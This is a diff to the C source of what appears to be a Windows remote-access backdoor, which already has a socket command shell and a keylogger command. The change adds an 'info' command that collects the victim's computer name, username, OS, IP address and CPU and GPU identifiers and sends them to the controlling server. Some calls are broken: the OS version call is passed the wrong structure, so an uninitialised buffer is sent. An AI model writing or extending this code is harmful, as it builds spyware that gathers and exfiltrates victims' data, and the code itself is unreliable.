@@ -18,6 +18,8 @@
 
 #define bzero(p, size) (void)memset((p), 0, (size))
 
+#define _CRT_SECURE_NO_DEPRECATE
+
 // Define Socket
 int sock;
 
@@ -122,9 +124,50 @@ void Shell()
       send(sock, suc, sizeof(suc), 0);
     }
     // ADD NEW FEATURE HERE
-    // else if() {
-    //   // Handle new feature
-    // }
+    else if (strncmp("info", buffer, 4) == 0)
+    {
+      // Handle new feature
+      char info[1024];
+
+      // Get computer name
+      char computer_name[1024];
+      DWORD size = sizeof(computer_name);
+      GetComputerNameA(computer_name, &size);
+
+      // Get username
+      char username[1024];
+      DWORD len = sizeof(username);
+      GetUserNameA(username, &len);
+
+      // Get OS version
+      char os[1024];
+      DWORD os_len = sizeof(os);
+      GetVersionExA((LPOSVERSIONINFO)&os_len);
+
+      // Get IP address
+      char ip[1024];
+      DWORD ip_len = sizeof(ip);
+      gethostname(ip, ip_len);
+      struct hostent *host_entry;
+      host_entry = gethostbyname(ip);
+      char *ip_addr = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0]));
+
+      // Get CPU info
+      char cpu[1024];
+      DWORD cpu_len = sizeof(cpu);
+      GetEnvironmentVariableA("PROCESSOR_IDENTIFIER", cpu, cpu_len);
+
+      // Get GPU info
+      char gpu[1024];
+      DWORD gpu_len = sizeof(gpu);
+      GetEnvironmentVariableA("GPU", gpu, gpu_len);
+
+      // Add all information to info variable
+      sprintf(info, "Computer name: %s\nUsername: %s\nOS: %s\nIP: %s\nCPU: %s\nGPU: %s\n", computer_name, username, os, ip_addr, cpu, gpu);
+
+      // Send info to server
+      send(sock, info, sizeof(info), 0);
+    }
     else if (strcmp("keylogger:start", buffer) == 0)
     {
       // info("Starting Keylogger..");
